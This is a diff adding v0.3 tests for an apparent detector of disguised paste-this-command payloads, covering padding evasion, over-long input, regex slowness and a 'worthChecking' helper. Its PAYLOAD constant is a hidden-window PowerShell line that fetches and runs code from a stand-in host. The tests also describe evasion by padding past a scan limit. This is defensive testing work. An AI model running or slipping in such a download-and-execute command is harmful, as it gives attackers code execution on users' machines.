@@ -127,3 +127,54 @@ test('disguise removal still works when a page breaks String.replace (found whil
     RegExp.prototype.exec = savedExec;
   }
 });
+
+// ---- v0.3: long text and slow patterns ---------------------------------------
+const PAYLOAD = 'powershell -w h -c "iwr https://x.example.invalid/a | iex"';
+
+test('padding a command with blank lines, spaces or comments does not hide it (v0.3)', () => {
+  // v0.2 checked only the first 20,000 characters, so this padding hid the payload.
+  for (const pad of [' '.repeat(25000), '\n'.repeat(25000), '#\n'.repeat(12500), ' '.repeat(199000)]) {
+    assert.equal(d.check(pad + PAYLOAD, '').verdict, 'block', `padding of ${pad.length}`);
+  }
+});
+
+test('text longer than the check limit is held, never simply allowed (v0.3)', () => {
+  const limit = rules.limits.maxChars;
+  const r = d.check(' '.repeat(limit + 10) + PAYLOAD, '');
+  assert.equal(r.verdict, 'hold');
+  assert.equal(r.rule, 'too-long');
+  assert.match(r.reasons.join(' '), /Too long to check completely/);
+  assert.equal(d.check('lorem ipsum '.repeat(30000), '').rule, 'too-long');
+  assert.equal(d.check('lorem ipsum '.repeat(10000), '').verdict, 'allow', '120,000 characters of prose are still checked and allowed');
+});
+
+test('every rule stays fast on hostile 200,000-character text (v0.3)', () => {
+  // v0.2 had four patterns that took over 40 seconds each on input like this.
+  const units = ['\\', '\\\\a', 'a.', '0.', 'a-', 'a.top.', '#', ':', '%a', 'http://', '-e ', '"', ' ', '\n', 'powershell '];
+  const N = 200000;
+  let worst = 0;
+  let worstWhat = '';
+  for (const group of [rules.command, rules.page]) {
+    for (const list of Object.values(group)) {
+      for (const r of list) {
+        const re = new RegExp(r.pattern, 'i');
+        for (const u of units) {
+          const s = u.repeat(Math.ceil(N / u.length)).slice(0, N);
+          const t = process.hrtime.bigint();
+          re.exec(s);
+          const ms = Number(process.hrtime.bigint() - t) / 1e6;
+          if (ms > worst) { worst = ms; worstWhat = `${r.id} on ${JSON.stringify(u)}`; }
+        }
+      }
+    }
+  }
+  assert.ok(worst < 250, `slowest pattern took ${worst.toFixed(1)} ms (${worstWhat})`);
+});
+
+test('worthChecking: the guard and the isolated world agree on what is worth a look (v0.3)', () => {
+  assert.equal(d.worthChecking(d.analyzeCommand('Call support at 1-800-000-0000')), false);
+  assert.equal(d.worthChecking(d.analyzeCommand('hello world')), false);
+  assert.equal(d.worthChecking(d.analyzeCommand(PAYLOAD)), true);
+  assert.equal(d.worthChecking(d.analyzeCommand('see https://example.com')), true);
+  assert.equal(d.worthChecking(d.analyzeCommand('x'.repeat(rules.limits.maxChars + 1))), true);
+});
